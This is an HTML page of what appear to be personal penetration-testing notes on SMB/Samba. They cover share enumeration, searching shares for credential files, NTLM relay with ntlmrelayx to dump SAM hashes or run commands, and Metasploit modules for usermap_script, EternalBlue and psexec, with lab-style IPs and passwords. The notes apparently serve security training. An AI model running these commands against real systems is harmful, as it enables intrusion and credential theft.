<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="notion-container">
        <div class="notion-header">
            <h1>Samba (TCP/445)</h1>
            <p>Software dedicated to share files</p>
            
        </div>
        <div class="notion-body">
            <b>When there is in place a SMB server it's hihghly recommended to run the commands found in the NTLM section. (Responder, inveigh...)</b>
            <h2>Usage</h2>
            <ul>
                <h3>Connect to share</h3>
                <pre><code class="language-bash">smbclient //VICTIM_IP/NAME_OF_SHARE </code></pre>
                <p>A very intersting alternative is smbmap which allow us to view which share are we able to write with the user we are trying. Here are some exameples</p>
                <pre><code class="language-bash">smbmap -H 10.129.9.11 #connect with null session
smbmap  -u jason -p '34c8zuNBo91!@28Bszh' # connect with username and password
smbmap -H 10.129.9.11 -r notes # View content from notes share
smbmap -H 10.129.9.11 -r notes --download "notes\file.txt" #Download file.txt from notes share</code></pre>    

                <h3>List shares windows</h3>
                <pre><code class="language-bash">net view \\IP</code></pre>

                <pre><code class="language-bash">dir \\IP\SHARE</code></pre>
                <p> In case you are in a graphical environment you coud perform just from the explorer or the Windows + R</p>
                <pre><code class="language-powershell">\\192.168.220.129\Finance\</code></pre>
                <p>From powershell...</p>
                <pre><code class="language-powershell">Get-ChildItem \\192.168.220.129\Finance\</code></pre>
                
                <h3>Mouting units</h3>
                <ul>
                    <h4>Windows</h4>
                    <ul>
                        <p>In order to mount a unit using CMD you could use</p>
                        <pre><code class="language-powershell">net use n: \\192.168.220.129\Finance</code></pre>
                        <p>Once mounted you could perform a filtering by file name</p>
                        <pre><code class="language-powershell">dir n:\*cred* /s /b</code></pre>
                     </ul>  
                    <h4>Powershell</h4>
                    <ul>
                    <p>Perform a mounting with powershell</p>
                    <pre><code class="language-powershell">New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"</code></pre>
                    <p>In case you would need a credential</p>
                    <pre><code class="language-powershell">$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred</code></pre>
                    <p>Or even performing some filtering</p>
                    <pre><code class="language-powershell">Get-ChildItem -Recurse -Path N:\ -Include *cred* -File</code></pre>
                    </ul>
                    
                    <h4>Linux</h4>
                    <ul>
                        <p>Mount unit by doing:</p>
                        <pre><code class="language-bash">sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance</code></pre>
                        <p>In acse of requring credentials</p>
                        <pre><code class="language-bash">mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile</code></pre>
                        <p>Credential file must have the following format</p>
                        <pre><code class="language-bash">username=plaintext
password=Password123
domain=.</code></pre>
                        <p>Once inside we can use find in order to locate files</p>
                        <pre><code class="language-bash">find /mnt/Finance/ -name *cred*</code></pre>
                    </ul>
                </ul>
            </ul>

            <h2>Enumeration</h2>
            <ul>
                <h3>Enumeration of shares</h3>
                <pre><code class="language-bash">smbclient -L VICTIM_IP -N </code></pre>
                <p>In case you have a username it is possible to use smbmap to check where you can access</p>
                <pre><code class="language-bash">smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></pre>
                

                <h3>Enumeration of usernames</h3>
                <p>This can be done if null session is active</p>
                <pre><code class="language-bash">crackmapexec smb 172.16.5.5 --users</code></pre>

                <h3>Enumeration of files</h3>
                <ul>
                    <p>In case would you like to list files inside a share you could do some spidering with netexec. Here are some examples</p>
                    <pre><code class="language-bash">netexec smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"</code></pre>
                    <p>Another way to do so</p>
                    <pre><code class="language-bash">netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'</code></pre>
                    <p>Also you can download all files and then perform some filtering over them</p>
                    <pre><code class="language-bash">smb 10.129.234.173 -u jbader -p "ILovePower333###" -M spider_plus Finance -o DOWNLOAD_FLAG=True --smb-timeout 60</code></pre>
                    <p>In order to perform the filtering, identify the folder and perform a grep. This allows you to even grep within folders</p>
                    <pre><code class="language-bash">grep -ri "passw"</code></pre>
                </ul>

                
            </ul>    

            <h2>Explotation</h2>
            <ul>
                <h3>Samba "username map script" Command Execution</h3>
                <ul>
                    <p> Samba version 3.0.20 it explotable using the following</p>
                    <pre><code class="language-bash">use exploit/multi/samba/usermap_script </code></pre>
                </ul>    
            
                <h3>Interaction with the user - exploits</h3>
                <ul>
                    <p>CVE-2025-24071</p>
                </ul>

                <h3>Smbrelay</h3>
                <ul>
                    <p>In case you captured a NTLMv2 hash and you are not able to crack it. You should try to relay the authentication to another server.</p>    
                    <p>This way you'll be able to authenticate to the server in case you are allowed and dump SAM hashses</p>
                    <pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></pre>
                    <p>We can also create a reverse shell</p>
                    <pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'command'</code></pre>
                    
                </ul>

                <h3>EternalBlue</h3>
                <ul>
                    <p>SMB1 is vulnerable to a common vulnerability called Eternal Blue this one allows to inject code in SMB and spawn a shell as NT Authority\Systen</p>
                    <p>This vuln affects <b>WS 2008 to WS 2016 Remeber to try different exploits</b></p>
                    <p>Use the following metasploit module</p>
                    <pre><code class="language-bash">windows/smb/ms17_010_eternalblue</code></pre>
                </ul>

                <h3>Path traversal (Situationship)</h3>
                <ul>
                    <p>In case you found anywhere paths inside the SMB share that you cant no access since you cant list files there is a solution to access</p>
                    <p>The share may be wrong configured and will lead you access using a simple cd command and specifying the path</p>
                </ul>

                <h3>Alternate Data Streams (ADS)</h3>
                <ul>
                    <p>In case you find a file which seems suspicious and does not have any content it is possible that content is located in another data stream</p>
                    <p>Basically data streams are like branchs inside a file which let you store data. To view its content inside smb you can use the command <b>allinfo</b> over a file to view its contents</p>
                    <p>The output will be similar to:</p>
                    <pre><code class="language-bash">altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Wed Jul 21 02:47:12 PM 2021 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes</code></pre>
                   <p>As you can see there is a data stream called <b>Password</b> we can view its content using the command <b>more</b> over the file</p>
                </ul>

                <h3>Psexec using admin credentials</h3>
                <ul>
                    <p>In case you have admin credentials of a computer you may be able to use the following metasploit module which grants access to the server</p>
                    <pre><code class="language-bash">exploit/windows/smb/psexec</code></pre>
                </ul>

                
            </ul>
        </div>
    </div>


</body>
</html>